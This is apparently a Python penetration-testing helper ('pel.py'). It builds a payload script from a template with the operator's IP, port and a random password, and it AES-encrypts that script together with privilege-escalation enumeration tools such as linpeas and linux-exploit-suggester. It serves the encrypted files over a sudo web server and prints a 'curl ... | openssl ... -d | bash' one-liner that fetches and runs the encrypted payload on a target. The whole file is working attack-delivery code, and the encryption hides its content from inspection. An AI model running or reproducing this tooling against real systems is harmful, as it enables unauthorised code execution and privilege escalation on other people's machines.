import subprocess
import socket
import os
import signal
import sys
import random
import string

web_server_process = None

def cleanup_handler(signum, frame):
    global web_server_process
    if web_server_process:
        web_server_process.terminate()
    sys.exit(0)

def register_cleanup_handler():
    signal.signal(signal.SIGINT, cleanup_handler)

def get_tun0_ip():
    result = subprocess.run(["ip", "address", "show", "dev", "tun0"], capture_output=True, text=True)
    lines = result.stdout.split("\n")
    for line in lines:
        if "inet" in line:
            parts = line.split()
            return parts[1].split("/")[0]

def parse_arguments():
    if len(sys.argv) == 1:
        websrv_ip = get_tun0_ip()
        websrv_port = 80
    elif len(sys.argv) == 2:
        if all(part.isdigit() and 0 <= int(part) <= 255 for part in sys.argv[1].split(".")):
            websrv_ip = sys.argv[1]
            websrv_port = 80
        else:
            websrv_ip = get_tun0_ip()
            websrv_port = int(sys.argv[1])
    elif len(sys.argv) == 3:
        websrv_ip = sys.argv[1]
        websrv_port = int(sys.argv[2])
    else:
        print("Usage: python3 pel.py [websrv_ip] [websrv_port]")
        sys.exit(1)
    
    return websrv_ip, websrv_port

def generate_random_password(length=16):
    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for i in range(length))
    return password

def replace_placeholders(template_path, output_path, websrv_ip, websrv_port, password):
    with open(template_path, "r") as template_file:
        template_content = template_file.read()
    
    template_content = template_content.replace("<IPADDRESS>", websrv_ip)
    template_content = template_content.replace("<PORT>", str(websrv_port))
    template_content = template_content.replace("<PASSWORD>", password)
    
    with open(output_path, "w") as output_file:
        output_file.write(template_content)

def encrypt_file(input_path, output_path, password):
    subprocess.run(["openssl", "enc", "-aes-256-cbc", "-pbkdf2", "-salt", 
                    "-pass", f"pass:{password}", "-in", input_path, "-out", output_path])

def encrypt_scripts_with_same_password(password):
    scripts = [
        (os.path.expanduser("~/.local/bin/websrv/linenum.sh"), os.path.expanduser("~/.local/bin/websrv/enc/le.enc")),
        (os.path.expanduser("~/.local/bin/websrv/linux-exploit-suggester.sh"), os.path.expanduser("~/.local/bin/websrv/enc/les.enc")),
        (os.path.expanduser("~/.local/bin/websrv/dirscan.sh"), os.path.expanduser("~/.local/bin/websrv/enc/ds.enc")),
        (os.path.expanduser("~/.local/bin/websrv/linpeas.sh"), os.path.expanduser("~/.local/bin/websrv/enc/lp.enc")),
        (os.path.expanduser("~/.local/bin/websrv/lse.sh"), os.path.expanduser("~/.local/bin/websrv/enc/lse.enc")),
        (os.path.expanduser("~/.local/bin/websrv/pel.sh"), os.path.expanduser("~/.local/bin/websrv/pel.enc"))
    ]
    
    for input_path, output_path in scripts:
        encrypt_file(input_path, output_path, password)

def print_curl_command(websrv_ip, websrv_port, password):
    print("\033[93m")
    print(f"curl {websrv_ip}:{websrv_port}/pel.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:{password} | bash")
    print("\033[0m")

def start_web_server(websrv_port):
    global web_server_process
    os.chdir(os.path.expanduser("~/.local/bin/websrv"))
    web_server_process = subprocess.Popen(["sudo", "python3", "-m", "http.server", str(websrv_port)])
    web_server_process.wait()

def main():
    register_cleanup_handler()
    websrv_ip, websrv_port = parse_arguments()
    template_path = os.path.expanduser("~/.local/bin/pel/pel.sh")
    output_path = os.path.expanduser("~/.local/bin/websrv/pel.sh")
    encrypted_output_path = os.path.expanduser("~/.local/bin/websrv/enc/pel.enc")
    
    password = generate_random_password()
    replace_placeholders(template_path, output_path, websrv_ip, websrv_port, password)
    encrypt_file(output_path, encrypted_output_path, password)
    print_curl_command(websrv_ip, websrv_port, password)
    encrypt_scripts_with_same_password(password)
    start_web_server(websrv_port)

if __name__ == "__main__":
    main()
